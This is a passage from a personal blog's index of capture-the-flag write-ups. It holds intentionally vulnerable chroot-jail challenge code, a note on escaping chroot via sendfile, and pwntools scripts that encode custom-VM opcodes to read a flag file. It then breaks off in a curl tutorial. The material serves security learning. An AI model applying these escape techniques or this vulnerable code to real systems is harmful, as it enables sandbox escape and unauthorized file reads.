+    <content><![CDATA[<p>审洞，chroot以后没有chdir，会保留当前文件夹下的状态信息，可以直接到需要的目录下运行读取，sendfile可以跨chroot把东西读出来</p>
+<pre><code class="cpp">#define _GNU_SOURCE 1
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/sendfile.h&gt;
+
+int main(int argc, char **argv, char **envp)
+&#123;
+    assert(argc &gt; 0);
+
+    printf(&quot;###\n&quot;);
+    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
+    printf(&quot;###\n&quot;);
+    printf(&quot;\n&quot;);
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts(&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;);
+    puts(&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;);
+    puts(&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;);
+    puts(&quot;program (argv[1]).\n&quot;);
+
+    assert(argc &gt; 1);
+
+    char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;;
+    assert(mkdtemp(jail_path) != NULL);
+
+    printf(&quot;Creating a jail at `%s`.\n&quot;, jail_path);
+
+    assert(chroot(jail_path) == 0);
+
+    int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT);
+    write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10);
+    close(fffd);
+
+    printf(&quot;Sending the file at `%s` to stdout.\n&quot;, argv[1]);
+    sendfile(1, open(argv[1], 0), 0, 128);
+
+&#125;
+</code></pre>
+<p>level2</p>
+<pre><code class="cpp">#define _GNU_SOURCE 1
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/sendfile.h&gt;
+
+#include &lt;capstone/capstone.h&gt;
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+&#123;
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)
+    &#123;
+        printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);
+        return;
+    &#125;
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &amp;insn);
+    if (count &gt; 0)
+    &#123;
+        size_t j;
+        printf(&quot;      Address      |                      Bytes                    |          Instructions\n&quot;);
+        printf(&quot;------------------------------------------------------------------------------------------\n&quot;);
+
+        for (j = 0; j &lt; count; j++)
+        &#123;
+            printf(&quot;0x%016lx | &quot;, (unsigned long)insn[j].address);
+            for (int k = 0; k &lt; insn[j].size; k++) printf(&quot;%02hhx &quot;, insn[j].bytes[k]);
+            for (int k = insn[j].size; k &lt; 15; k++) printf(&quot;   &quot;);
+            printf(&quot; | %s %s\n&quot;, insn[j].mnemonic, insn[j].op_str);
+        &#125;
+
+        cs_free(insn, count);
+    &#125;
+    else
+    &#123;
+        printf(&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;);
+        printf(&quot;      Address      |                      Bytes\n&quot;);
+        printf(&quot;--------------------------------------------------------------------\n&quot;);
+        for (unsigned int i = 0; i &lt;= shellcode_size; i += 16)
+        &#123;
+            printf(&quot;0x%016lx | &quot;, (unsigned long)shellcode_addr+i);
+            for (int k = 0; k &lt; 16; k++) printf(&quot;%02hhx &quot;, ((uint8_t*)shellcode_addr)[i+k]);
+            printf(&quot;\n&quot;);
+        &#125;
+    &#125;
+
+    cs_close(&amp;handle);
+&#125;
+
+int main(int argc, char **argv, char **envp)
+&#123;
+    assert(argc &gt; 0);
+
+    printf(&quot;###\n&quot;);
+    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
+    printf(&quot;###\n&quot;);
+    printf(&quot;\n&quot;);
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts(&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;);
+    puts(&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;);
+
+    puts(&quot;You may open a specified file, as given by the first argument to the program (argv[1]).\n&quot;);
+
+    puts(&quot;You may upload custom shellcode to do whatever you want.\n&quot;);
+
+    assert(argc &gt; 1);
+
+    puts(&quot;Checking to make sure you&#39;re not trying to open the flag.\n&quot;);
+    assert(strstr(argv[1], &quot;flag&quot;) == NULL);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd &lt; 0)
+        printf(&quot;Failed to open the file located at `%s`.\n&quot;, argv[1]);
+    else
+        printf(&quot;Successfully opened the file located at `%s`.\n&quot;, argv[1]);
+
+    char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;;
+    assert(mkdtemp(jail_path) != NULL);
+
+    printf(&quot;Creating a jail at `%s`.\n&quot;, jail_path);
+
+    assert(chroot(jail_path) == 0);
+
+    int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT);
+    write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10);
+    close(fffd);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf(&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;, shellcode);
+
+    puts(&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;);
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts(&quot;This challenge is about to execute the following shellcode:\n&quot;);
+    print_disassembly(shellcode, shellcode_size);
+    puts(&quot;&quot;);
+
+    puts(&quot;Executing shellcode!\n&quot;);
+
+    ((void(*)())shellcode)();
+&#125;
+</code></pre>
+<blockquote>
+<p>.&#x2F;flag</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>vm初探</title>
+    <url>/2024/04/08/vm%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h6 id="PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce-amp-leak-opcode（由于附件不同这里exp相当于一个思路）"><a href="#PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce-amp-leak-opcode（由于附件不同这里exp相当于一个思路）" class="headerlink" title="PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce &amp; leak opcode（由于附件不同这里exp相当于一个思路）"></a>PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce &amp; leak opcode（由于附件不同这里exp相当于一个思路）</h6><span id="more"></span>
+
+<h5 id="直白的orw"><a href="#直白的orw" class="headerlink" title="直白的orw"></a>直白的orw</h5><p>21.1</p>
+<p>（ps.后面看这里有点问题的，偏移其实不对，但是可以通，很奇妙，可能是有什么奇妙巧合？）</p>
+<pre><code class="python">
+from pwn import *
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;)
+# context(log_level=&#39;debug&#39;)
+# context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+# p = gdb.debug(&#39;./babyrev_level21.0&#39;,&#39;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#39;)
+p = process([&#39;strace&#39;,&#39;./babyrev_level21.1&#39;])
+# p = process(&#39;./babyrev_level21.1&#39;)
+def register(name):
+    match name:
+        case &#39;opcode[1024]&#39;:
+            return 64
+        case &#39;opcode[1025]&#39;:
+            return 1
+        case &#39;opcode[1026]&#39;:
+            return 16
+        case &#39;opcode[1027]&#39;:
+            return 4
+        case &#39;opcode[1028]&#39;:
+            return 8
+        case &#39;opcode[1029]&#39;:
+            return 32
+    print(&#39;err register&#39;)
+
+def interpret_instruction(name):
+    match name:
+        case &#39;interpret_imm&#39;:
+            return 0x200
+        case &#39;interpret_add&#39;:
+            return 0x400
+        case &#39;interpret_stk&#39;:
+            return 0x800
+        case &#39;interpret_stm&#39;:
+            return 0x100
+        case &#39;interpret_ldm&#39;:
+            return 0x1000
+        case &#39;interpret_cmp&#39;:
+            return 0x8000
+        case &#39;interpret_jmp&#39;:
+            return 0x2000
+        case &#39;interpret_sys&#39;:
+            return 0x4000
+    print(&#39;err instruction&#39;)
+
+def interpret_imm(regs,value):
+    return interpret_instruction(&#39;interpret_imm&#39;) + register(regs) + (value &lt;&lt; 16)
+
+def interpret_stm():
+    # opcode[1025] = offset
+    # opcode[1026] = value
+    return interpret_instruction(&#39;interpret_stm&#39;) + (register(&#39;opcode[1025]&#39;)) + (register(&#39;opcode[1026]&#39;) &lt;&lt; 16)
+
+def interpret_sys(name):
+    match name:
+        case &#39;open&#39;:
+            return 0x20
+        case &#39;read_code&#39;:
+            return 0x4
+        case &#39;read&#39;:
+            return 0x8
+        case &#39;write&#39;:
+            return 0x2
+        case &#39;sleep&#39;:
+            return 0x10
+        case &#39;exit&#39;:
+            return 0x1
+    print(&#39;err sys&#39;)
+
+def open():
+    # opcode[opcode[1024] + 768] = addr
+    # opcode[1024] = fd
+    # opcode[1026] = len
+    return interpret_sys(&#39;open&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1024]&#39;) &lt;&lt; 16)
+
+def read():
+    # opcode[1024] = fd
+    # opcode[1025] = ret len
+    return interpret_sys(&#39;read&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 16)
+
+def write():
+    # opcode[1024] = fd
+    return interpret_sys(&#39;write&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 16)
+
+def exitPro():
+    return interpret_sys(&#39;exit&#39;) + interpret_instruction(&#39;interpret_sys&#39;)
+
+opcode_func = &#39;&#39;&#39;
+interpret_imm(&#39;opcode[1025]&#39;,768) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;/&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,769) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;f&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,770) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;l&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,771) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;a&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,772) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;g&#39;)) # value
+interpret_stm()
+
+interpret_imm(&#39;opcode[1024]&#39;,0) # addr = opcode[0 + 768]
+interpret_imm(&#39;opcode[1025]&#39;,0)
+interpret_imm(&#39;opcode[1026]&#39;,0)
+open()
+
+interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
+read()
+
+interpret_imm(&#39;opcode[1024]&#39;,1)
+interpret_imm(&#39;opcode[1025]&#39;,0)
+interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
+write()
+exitPro()
+&#39;&#39;&#39;
+opcode = []
+opcode_func = opcode_func.split(&#39;\n&#39;)
+# print(opcode_func)
+for i in opcode_func:
+    if (i == &#39;&#39;):
+        continue
+    p48 = eval(i)
+    opcode.append(p48 &amp; 0xff)
+    opcode.append((p48 &amp; 0xff00) &gt;&gt; 8)
+    opcode.append((p48 &amp; 0xff0000) &gt;&gt; 16)
+opcode+=([0] * (0x300 - len(opcode)))
+
+a = opcode
+a = b&#39;&#39;.join([bytes([i]) for i in a])
+# print(a)
+p.send(a)
+p.interactive()
+</code></pre>
+<h5 id="随机化opcode的orw"><a href="#随机化opcode的orw" class="headerlink" title="随机化opcode的orw"></a>随机化opcode的orw</h5><p>22.0</p>
+<p>爆破的思路：</p>
+<p>种子一共0xff个，没有尝试直接爆，徒手一步一步做的（注释掉的就是思路），从exit为入口点一步一步推一步一步还原（这里最后的open只有三个可能的值<code>1|8|64</code>，直接手试了）:</p>
+<pre><code class="python">
+from pwn import *
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;)
+# context(log_level=&#39;debug&#39;)
+# context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+# p = gdb.debug(&#39;./babyrev_level21.0&#39;,&#39;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#39;)
+# p = process([&#39;strace&#39;,&#39;./babyrev_level22.0&#39;])
+
+# ------------------------------------------------
+### sys:16  | exit:1
+### interpret_imm:4 | opcode[1024]:8
+### sleep:128
+### read_code|read_memory:2/32                 opcode[1029]:64   none:4
+### add:2
+# ------------------------------------------------
+
+## test exit
+### sys:16, exit:1
+# table = [1,2,4,8,16,32,64,0x80]
+# for i in table:
+#     for j in table:
+#         a = []
+#         a.append(5)
+#         a.append(j)
+#         a.append(i)
+#         a += [0] * 0x300
+#         a = b&#39;&#39;.join([bytes([i]) for i in a])
+#         p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#         p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
+#         h = p.recv(4096)
+#         print(i)
+#         print(j)
+
+## test interpret_imm, opcode | search : &quot;exit code 5&quot;
+# table = [1,2,4,8,16,32,64,0x80]
+# for i in table:
+#     for j in table:
+#         a = []
+#         a.append(5)
+#         a.append(j)
+#         a.append(i)
+#         a.append(0)
+#         a.append(16)
+#         a.append(1)
+#         a += [0] * 0x250
+#         a = b&#39;&#39;.join([bytes([i]) for i in a])
+#         p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#         p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
+#         h = p.recv(4096)
+#         print(i)
+#         print(j)
+
+## test sleep 128
+# table = [1,2,4,8,16,32,64,0x80]
+# for i in table:
+#     a = []
+#     a.append(0x10)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 0
+#     a.append(0x10)
+#     a.append(i)
+#     a.append(1) # sleep
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
+#     p.interactive()
+#     # print(h)
+#     print(i)
+
+# use exit and add can exploit all the regs
+## find add first:2
+# import time
+# table = [1,2,4,8,16,32,64,0x80]
+# for j in table:
+#     print(j)
+#     a = []
+#     a.append(3)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 3
+#     a.append(8)
+#     a.append(8)
+#     a.append(j) # test add
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     p.kill()
+
+## test ldm
+# 32
+# table = [1,2,4,8,16,32,64,0x80]
+# for j in table:
+#     print(j)
+#     a = []
+#     a.append(3)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 10
+#     a.append(8)
+#     a.append(8)
+#     a.append(j) # test ldm
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     p.kill()
+
+## test stm
+# 64
+# table = [1,2,4,8,16,32,64,0x80]
+# for j in table:
+#     print(j)
+#     a = []
+#     a.append(3)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 3
+#     a.append(8)
+#     a.append(1)
+#     a.append(j) # test stm opcode[768] = 3;
+#     a.append(5)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 5 # failed to write
+#     a.append(1)
+#     a.append(8)
+#     a.append(32) # ldm
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     p.kill()
+
+# # # write
+# # write:4
+# table = [1,2,4,8,16,32,64,0x80]
+# for j in table:
+#     if (j == 16 or j == 128 or j == 2 or j == 32):
+#         continue
+#     print(j)
+#     a = []
+#     a.append(ord(&#39;^&#39;))
+#     a.append(8)
+#     a.append(4) # opcode[1024] = ord(&#39;^&#39;)
+#     a.append(8)
+#     a.append(1)
+#     a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
+#     a.append(1)
+#     a.append(1)
+#     a.append(4) # opcode[[1]] ++
+#     a.append(8)
+#     a.append(1)
+#     a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+#     a.append(2)
+#     a.append(1)
+#     a.append(4) # opcode[[1]] ++
+#     a.append(8)
+#     a.append(1)
+#     a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+#     for i in table: # all register = 1
+#         if (i == 8 or i == 4 or i == 64):
+#             continue
+#         a.append(1)
+#         a.append(i)
+#         a.append(4)
+#     a.append(1)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 1 # fd = io
+#     a.append(1)
+#     a.append(j)
+#     a.append(1) # write
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.3)
+#     print(p.recv())
+#     p.kill()
+
+# ## opcode[1025]
+# # 1
+# table = [1,2,4,8,16,32,64,0x80]
+# tmp_a = []
+# tmp_a.append(ord(&#39;^&#39;))
+# tmp_a.append(8)
+# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
+# tmp_a.append(1)
+# tmp_a.append(1)
+# tmp_a.append(4) # opcode[[1]] ++
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+# tmp_a.append(2)
+# tmp_a.append(1)
+# tmp_a.append(4) # opcode[[1]] ++
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+
+# for k in table: # test_register = 1
+#     a = tmp_a.copy()
+#     # print(a)
+#     if (k == 8 or k == 4 or k == 64):
+#         continue
+#     for i in table: # all register = 0
+#         if (i == 8 or i == 4 or i == 64):
+#             continue
+#         a.append(0)
+#         a.append(i)
+#         a.append(4)
+#     print(k)
+#     a.append(2)
+#     a.append(k)
+#     a.append(4) # one register = 1    
+#     a.append(1)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 1 # fd = io
+#     a.append(1)
+#     a.append(4)
+#     a.append(1) # write
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     print(p.recv())
+#     p.kill()
+
+
+
+##  opcode[1025]
+# 32
+# table = [1,2,4,8,16,32,64,0x80]
+# tmp_a = []
+# tmp_a.append(ord(&#39;^&#39;))
+# tmp_a.append(8)
+# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
+# tmp_a.append(1)
+# tmp_a.append(1)
+# tmp_a.append(4) # opcode[[1]] ++
+# tmp_a.append(ord(&#39;@&#39;))
+# tmp_a.append(8)
+# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+# tmp_a.append(2)
+# tmp_a.append(1)
+# tmp_a.append(4) # opcode[[1]] ++
+# tmp_a.append(ord(&#39;#&#39;))
+# tmp_a.append(8)
+# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
+# tmp_a.append(8)
+# tmp_a.append(1)
+# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
+
+# for k in table: # test opcode[1025]
+#     if (k == 1 or k == 8 or k == 64 or k == 4):
+#         continue
+#     a = tmp_a.copy()
+#     # print(a)
+#     for i in table: # all register = 0
+#         if (i == 8 or i == 4 or i == 64 or i == 1):
+#             continue
+#         a.append(0)
+#         a.append(i)
+#         a.append(4)
+#     print(k)
+#     a.append(1)
+#     a.append(k)
+#     a.append(4) # opcode[1025] # offset: 1  
+
+#     a.append(1)
+#     a.append(1)
+#     a.append(4) # opcode[1026] # len: 1  
+#     a.append(1)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 1 # fd = io
+#     a.append(1)
+#     a.append(4)
+#     a.append(1) # write
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     print(p.recv())
+#     p.kill()
+
+
+# # read
+# 32
+# table = [1,2,4,8,16,32,64,0x80]
+# for k in [2,32]: # test read
+#     a = []
+#     print(k)
+#     a.append(1)
+#     a.append(32)
+#     a.append(4) # opcode[1025] # offset: 1  
+
+#     a.append(1)
+#     a.append(1)
+#     a.append(4) # opcode[1026] # len: 1 
+
+#     a.append(0)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 0 # fd = io
+
+#     a.append(2)
+#     a.append(k)
+#     a.append(1) # read
+
+#     a.append(1)
+#     a.append(8)
+#     a.append(4) # opcode[1024] = 1 # fd = io
+
+#     a.append(1)
+#     a.append(4)
+#     a.append(1) # write
+#     a.append(0)
+#     a.append(16)
+#     a.append(1) # exit
+#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
+#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
+#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
+#     time.sleep(0.1)
+#     # print(p.recv())
+#     p.interactive()
+#     p.kill()
+
+
+
+# ----------------------------------------------------------------------------------------------------------------------------------- #
+#                                                               open -&gt; 
+# ----------------------------------------------------------------------------------------------------------------------------------- #
+def register(name):
+    if (name == &#39;opcode[1024]&#39;):
+        return 8
+    if (name == &#39;opcode[1025]&#39;):
+        return 32
+    if (name == &#39;opcode[1026]&#39;):
+        return 1
+    if (name == &#39;opcode[1027]&#39;):
+        return 0
+    if (name == &#39;opcode[1028]&#39;):
+        return 0
+    if (name == &#39;opcode[1029]&#39;):
+        return 64
+    print(&#39;err register&#39;)
+
+def interpret_instruction(name):
+    if (name == &#39;interpret_imm&#39;):
+        return 4 &lt;&lt; 16
+    if (name == &#39;interpret_add&#39;):
+        return 2 &lt;&lt; 16
+    if (name == &#39;interpret_stk&#39;):
+        return 0
+    if (name == &#39;interpret_stm&#39;):
+        return 64 &lt;&lt; 16
+    if (name == &#39;interpret_ldm&#39;):
+        return 32 &lt;&lt; 16
+    if (name == &#39;interpret_cmp&#39;):
+        return 0
+    if (name == &#39;interpret_jmp&#39;):
+        return 0
+    if (name == &#39;interpret_sys&#39;):
+        return 1 &lt;&lt; 16
+    print(&#39;err instruction&#39;)
+
+def interpret_imm(regs,value):
+    return interpret_instruction(&#39;interpret_imm&#39;) + (register(regs) &lt;&lt; 8) + (value)
+
+def interpret_stm():
+    # opcode[1025] = offset
+    # opcode[1026] = value
+    return interpret_instruction(&#39;interpret_stm&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 8) + (register(&#39;opcode[1026]&#39;))
+
+def interpret_sys(name):
+    if (name == &#39;open&#39;):
+        return 8 &lt;&lt; 8
+    if (name == &#39;read_code&#39;):
+        return 2 &lt;&lt; 8
+    if (name == &#39;read&#39;):
+        return 32 &lt;&lt; 8
+    if (name == &#39;write&#39;):
+        return 4 &lt;&lt; 8
+    if (name == &#39;sleep&#39;):
+        return 128 &lt;&lt; 8
+    if (name == &#39;exit&#39;):
+        return 16 &lt;&lt; 8
+    print(&#39;err sys&#39;)
+
+def open():
+    # opcode[opcode[1024] + 768] = addr
+    # opcode[1024] = fd
+    # opcode[1026] = len
+    return interpret_sys(&#39;open&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1024]&#39;) )
+
+def read():
+    # opcode[1024] = fd
+    # opcode[1025] = ret len
+    return interpret_sys(&#39;read&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) )
+
+def write():
+    # opcode[1024] = fd
+    return interpret_sys(&#39;write&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) )
+
+def exitPro():
+    return interpret_sys(&#39;exit&#39;) + interpret_instruction(&#39;interpret_sys&#39;)
+
+opcode_func = &#39;&#39;&#39;
+interpret_imm(&#39;opcode[1025]&#39;,0) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;/&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,1) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;f&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,2) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;l&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,3) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;a&#39;)) # value
+interpret_stm()
+interpret_imm(&#39;opcode[1025]&#39;,4) # offset
+interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;g&#39;)) # value
+interpret_stm()
+
+interpret_imm(&#39;opcode[1024]&#39;,0) # addr = opcode[0 + 768]
+interpret_imm(&#39;opcode[1025]&#39;,0)
+interpret_imm(&#39;opcode[1026]&#39;,0)
+open()
+
+interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
+read()
+
+interpret_imm(&#39;opcode[1024]&#39;,1)
+interpret_imm(&#39;opcode[1025]&#39;,0)
+interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
+write()
+exitPro()
+&#39;&#39;&#39;
+opcode = []
+opcode_func = opcode_func.split(&#39;\n&#39;)
+# print(opcode_func)
+for i in opcode_func:
+    if (i == &#39;&#39;):
+        continue
+    p48 = eval(i)
+    opcode.append(p48 &amp; 0xff)
+    opcode.append((p48 &amp; 0xff00) &gt;&gt; 8)
+    opcode.append((p48 &amp; 0xff0000) &gt;&gt; 16)
+opcode+=([0] * (0x300 - len(opcode)))
+
+a = opcode
+# print(a)
+a = b&#39;&#39;.join([bytes([i]) for i in a])
+
+p = process(&#39;/challenge/babyrev_level22.0&#39;)
+p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
+p.interactive()
+p.kill()
+</code></pre>
+]]></content>
+  </entry>
+  <entry>
+    <title>web入门操作</title>
+    <url>/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><ul>
+<li>curl 发送 get指令</li>
+</ul>
+<blockquote>
+<p>curl 127.0.0.1 -p 80</p>
+</blockquote>
+<p>注意url编码</p>
+<p>添加header</p>
+<blockquote>
+<p>curl 127.0.0.1 -p 80 –header “Host:40bb89ca76728698378750073647169d”</p>
+</blockquote>
+<p>注意转义</p>
+<blockquote>
+<p>curl 127.0.0.1?a&#x3D;963fe9d3ff95f80bff64f57c210a739f<br>\&amp;b&#x3D;f8e12324%202bbd1304%2634341212%231eebbb9b</p>
+</blockquote>
+<p>POST data：</p>
+<blockquote>
+<p>curl 127.0.0.1 -d a&#x3D;5129ddc180c847f3788d5493e2fdea93</p>
+</blockquote>
+<p>发送json（json内不需要转义）</p>
+<blockquote>
